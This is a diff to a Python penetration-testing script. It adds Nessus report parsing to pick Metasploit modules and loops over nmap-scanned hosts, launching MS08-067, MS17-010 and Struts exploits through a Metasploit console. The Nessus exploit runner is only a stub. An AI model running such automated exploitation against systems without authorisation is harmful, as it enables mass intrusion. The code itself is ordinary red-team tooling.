@@ -11,6 +11,7 @@ from IPython import embed
 from termcolor import colored
 from threading import Thread, Lock
 from libnmap.process import NmapProcess
+from libnessus.parser import NessusParser
 from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
 from libnmap.parser import NmapParser, NmapParserException
@@ -62,6 +63,33 @@ def run_proc(cmd):
     proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)
 
     return proc
+
+def parse_nessus(args):
+    '''
+    Parses .nessus files for vulnerabilities that metasploit can exploit
+    '''
+    exploits = {}
+
+    report = NessusParser.parse_fromfile(args.nessus)
+
+    for i in report.hosts:
+        rep_items = i.get_report_items
+        for x in rep_items:
+            vuln_info = x.get_vuln_info
+            severity = x.severity
+            if int(severity) > 2:
+                if vuln_info.get('exploit_framework_metasploit'):
+                    if vuln_info['exploit_framework_metasploit'] == 'true':
+                        ip = i.address
+                        port = vuln_info['port']
+                        msf_mod = vuln_info['metasploit_name']
+
+                        if exploits.get(msf_mod):
+                            exploits[msf_mod].append((ip, port))
+                        else:
+                            exploits[msf_mod] = [(ip, port)]
+
+    return exploits
 
 def parse_nmap(args):
     '''
@@ -330,7 +358,7 @@ def check_vuln(c_id):
     '''
     Check if the machine is vulnerable
     '''
-    # potential messages: 
+    # potential messages:
     # Check failed: ..."
     # Cannot reliably check exploitability
     cmd = 'check\n'
@@ -347,23 +375,28 @@ def check_vuln(c_id):
 
     return False
 
-def run_exploits(c_id, host):
+def run_nessus_exploits(c_id, exploits):
+    pass
+
+
+def run_nmap_exploits(c_id, hosts):
     '''
     Checks for exploitable services on a host
     '''
-    # First check for ms08_067 and ms17_010
-    ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
-    ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
-    if ms08_vuln == True:
-        mod_output = run_ms08(c_id, host)
-    if ms17_vuln == True:
-        mod_output = run_ms17(c_id, host)
+    for host in hosts:
+        # First check for ms08_067 and ms17_010
+        ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
+        ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
+        if ms08_vuln == True:
+            mod_output = run_ms08(c_id, host)
+        if ms17_vuln == True:
+            mod_output = run_ms17(c_id, host)
 
-    for s in host.services:
-        if s.open():
-            if 'Apache Tomcat/Coyote JSP engine version: 1.1' in s.banner:
-                port = str(s.port)
-                mod_output = run_struts_dmi_rest_exec(c_id, host, port)
+        for s in host.services:
+            if s.open():
+                if 'Apache Tomcat/Coyote JSP engine version: 1.1' in s.banner:
+                    port = str(s.port)
+                    mod_output = run_struts_dmi_rest_exec(c_id, host, port)
 
 def run_if_vuln(c_id, cmd):
     is_vulnerable = check_vuln(c_id)
@@ -480,10 +513,6 @@ def main(report, args):
 
     lock = Lock()
 
-    # hosts will only be populated with ips that have open ports
-    # hosts = {ip : [(port, banner), (port2, banner2)]
-    hosts = get_hosts(report)
-
     # initialize keep alive process
     # won't attempt first login until 100s from start
     p = Thread(target=keep_alive, args=(args, lock))
@@ -505,8 +534,14 @@ def main(report, args):
     # Get the latest console
     c_id = c_ids[-1]
 
-    for host in hosts:
-        run_exploits(c_id, host)
+    if args.nessus:
+        # exploits = {'msf_module_name':[(ip, port), (ip, port)]
+        exploits = parse_nessus(args)
+        run_nessus_exploits(c_id, exploits)
+    else:
+        # hosts = {ip : [(port, banner), (port2, banner2)]
+        hosts = get_hosts(report)
+        run_nmap_exploits(c_id, hosts)
         remainder_output = wait_on_busy_console(c_id)
 
 if __name__ == "__main__":
